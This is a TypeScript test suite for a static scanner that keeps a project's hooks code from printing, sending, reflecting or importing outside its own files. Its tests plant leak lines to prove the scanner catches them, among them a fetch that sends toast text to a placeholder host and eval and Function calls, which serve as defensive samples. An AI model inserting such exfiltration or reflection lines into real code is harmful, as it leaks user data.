import { test } from "node:test";
import assert from "node:assert/strict";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanSource } from "../scripts/lib/source-scan.mjs";
import {
  GUARDED_DIRS,
  closureOf,
  listCode,
  outsideGuarded,
  scanTree,
} from "../scripts/lib/tree-scan.mjs";

// The privacy guard on the real tree (the same scan scripts/check-sources.mjs
// runs inside the footprint gate). Nothing the hooks load may print, send,
// time, reflect or run code, or import anything but its own files. A test
// that only says "the tree is clean" would pass if the scanner went blind, so
// the second half plants a leak in the text of real files and requires the
// scanner to find it.

const ROOT = new URL("..", import.meta.url).pathname;
const read = (rel: string): string => readFileSync(join(ROOT, rel), "utf8");

test("hooks/ and src/core/ hold no banned name, reflection, bracket access, dynamic import or foreign import", () => {
  const report = scanTree(ROOT);
  assert.deepEqual(
    report.findings.map((f) => `${f.file}:${f.line} ${f.rule} ${f.token}`),
    [],
  );
});

test("the files the hooks load all sit inside hooks/ and src/core/, and every import resolves", () => {
  const report = scanTree(ROOT);
  assert.deepEqual(report.outside, []);
  assert.deepEqual(report.missing, []);
});

test("the scan covers exactly what runs: every guarded code file is loaded, and every loaded file is scanned", () => {
  const report = scanTree(ROOT);
  assert.deepEqual(report.files, report.closure);
  assert.ok(report.files.length >= 20, `only ${report.files.length} files`);
  for (const dir of GUARDED_DIRS) {
    assert.ok(listCode(ROOT, dir).length > 0, dir);
  }
});

// A leak planted in the text of a real file, as an edit would plant it.
const PLANTED: [string, string, string][] = [
  ["hooks/cc.ts", "  console.error(clip.text);\n", "console"],
  ["hooks/cc.ts", "  process.stderr.write(clip.text);\n", "process"],
  [
    "hooks/input.ts",
    "  const home = globalThis.process?.env?.HOME;\n",
    "globalThis",
  ],
  [
    "hooks/outcome.ts",
    '  fetch("https://example.invalid/" + toastText);\n',
    "fetch",
  ],
  ["hooks/run.ts", "  setTimeout(() => {}, 1);\n", "setTimeout"],
  [
    "hooks/cc.ts",
    "  const k = (await deps.getMessages()).constructor;\n",
    "constructor",
  ],
  ["src/core/match.ts", "  console.log(copied);\n", "console"],
  ["src/core/strip.ts", '  const g = (0, eval)("this");\n', "eval"],
  ["src/core/inline.ts", '  new Function("return this")();\n', "Function"],
];

for (const [file, line, token] of PLANTED) {
  test(`planted in ${file}: ${line.trim()}`, () => {
    const original = read(file);
    assert.deepEqual(scanSource(original), [], "the real file must scan clean");
    const at = original.indexOf("\nexport ");
    const mutated = `${original.slice(0, at + 1)}${line}${original.slice(at + 1)}`;
    const found = scanSource(mutated).map((f) => f.token);
    assert.ok(
      found.includes(token),
      `${token} not found in: ${found.join(",")}`,
    );
  });
}

test("planted: a node: import added to a hooks file is refused", () => {
  for (const line of [
    'import { writeFileSync } from "node:fs";\n',
    'import "node:child_process";\n',
    'const fs = await import("node:fs");\n',
  ]) {
    const found = scanSource(`${line}${read("hooks/cc.ts")}`);
    assert.ok(found.length > 0, line);
  }
});

test("planted: an import of the captures tool (a file reader and writer) puts a file outside the closure", () => {
  const files: Record<string, string> = {
    "/r/hooks/register.tsx": 'import { go } from "./run.ts";',
    "/r/hooks/run.ts": 'import { read } from "../src/captures/clipboard.ts";',
    "/r/src/captures/clipboard.ts": "export function read() {}",
  };
  const io = {
    read: (file: string) => files[file] ?? "",
    exists: (file: string) => file in files,
  };
  const closure = closureOf("/r", "hooks/register.tsx", io);
  assert.deepEqual(closure.files, [
    "hooks/register.tsx",
    "hooks/run.ts",
    "src/captures/clipboard.ts",
  ]);
  assert.deepEqual(closure.missing, []);
  assert.deepEqual(outsideGuarded(closure.files), [
    "src/captures/clipboard.ts",
  ]);
});

test("planted: an import that does not resolve is reported, not skipped", () => {
  const files: Record<string, string> = {
    "/r/hooks/register.tsx": 'import { go } from "./gone.ts";',
  };
  const io = {
    read: (file: string) => files[file] ?? "",
    exists: (file: string) => file in files,
  };
  assert.deepEqual(closureOf("/r", "hooks/register.tsx", io).missing, [
    "hooks/register.tsx -> ./gone.ts",
  ]);
});

// A tree on disk: the scan must cover whatever the hooks load, whatever the
// file's extension, and must see a hooks module the manifest adds.
function inTree(
  files: Record<string, string>,
  check: (root: string) => void,
): void {
  const root = mkdtempSync(join(tmpdir(), "cc-tree-"));
  try {
    for (const [rel, text] of Object.entries(files)) {
      mkdirSync(dirname(join(root, rel)), { recursive: true });
      writeFileSync(join(root, rel), text);
    }
    check(root);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

const CLEAN_TREE = {
  "hooks/hooks.json": '{ "modules": ["register.tsx"] }',
  "hooks/register.tsx": 'import { go } from "./run.ts"; go();',
  "src/core/m.ts": "export const m = 1;",
};

for (const ext of ["mjs", "js", "cjs", "mts", "cts"]) {
  test(`a .${ext} file the hooks load is scanned like a .ts file`, () => {
    inTree(
      {
        ...CLEAN_TREE,
        "hooks/run.ts": `import "./leak.${ext}"; export function go() {}`,
        [`hooks/leak.${ext}`]: 'console.error("x");\n',
      },
      (root) => {
        const report = scanTree(root);
        assert.deepEqual(
          report.findings.map((f) => `${f.file} ${f.rule} ${f.token}`),
          [`hooks/leak.${ext} banned-name console`],
        );
      },
    );
  });
}

test("a clean temporary tree scans clean (the tree test is not vacuous)", () => {
  inTree(
    {
      ...CLEAN_TREE,
      "hooks/run.ts": "export function go() {}",
    },
    (root) => {
      const report = scanTree(root);
      assert.deepEqual(report.findings, []);
      assert.deepEqual(report.outside, []);
      assert.deepEqual(report.missing, []);
      assert.deepEqual(report.modules, ["register.tsx"]);
    },
  );
});

test("a second hooks module in the manifest is reported, and so is one outside hooks/", () => {
  for (const modules of [
    ["register.tsx", "extra.tsx"],
    ["register.tsx", "../scripts/evil.ts"],
    ["other.tsx"],
  ]) {
    inTree(
      {
        ...CLEAN_TREE,
        "hooks/hooks.json": JSON.stringify({ modules }),
        "hooks/run.ts": "export function go() {}",
      },
      (root) => {
        assert.deepEqual(scanTree(root).modules, modules);
      },
    );
  }
});

const CLI = join(ROOT, "scripts/check-sources.mjs");
const runGuard = (root: string) =>
  spawnSync(process.execPath, [CLI, root], { encoding: "utf8" });

test("check-sources exits 0 on a clean tree", () => {
  inTree(
    { ...CLEAN_TREE, "hooks/run.ts": "export function go() {}" },
    (root) => {
      const run = runGuard(root);
      assert.equal(run.status, 0, run.stderr);
      assert.match(run.stdout, /^check-sources: OK/);
    },
  );
});

test("check-sources exits 1 on a leak in a .mjs file the hooks load, and names file, line, rule and token only", () => {
  inTree(
    {
      ...CLEAN_TREE,
      "hooks/run.ts": 'import "./leak.mjs"; export function go() {}',
      "hooks/leak.mjs": 'const secretish = 1;\nconsole.error("x");\n',
    },
    (root) => {
      const run = runGuard(root);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /hooks\/leak\.mjs:2 banned-name console/);
      assert.equal(run.stderr.includes("secretish"), false);
    },
  );
});

test("check-sources exits 1 when the manifest names a second hooks module", () => {
  inTree(
    {
      ...CLEAN_TREE,
      "hooks/hooks.json":
        '{ "modules": ["register.tsx", "../scripts/evil.ts"] }',
      "hooks/run.ts": "export function go() {}",
    },
    (root) => {
      const run = runGuard(root);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /hooks\/hooks\.json: modules/);
    },
  );
});

test("check-sources exits 1 when the manifest cannot be read", () => {
  inTree(
    {
      ...CLEAN_TREE,
      "hooks/hooks.json": "not json",
      "hooks/run.ts": "export function go() {}",
    },
    (root) => {
      assert.equal(runGuard(root).status, 1);
    },
  );
});
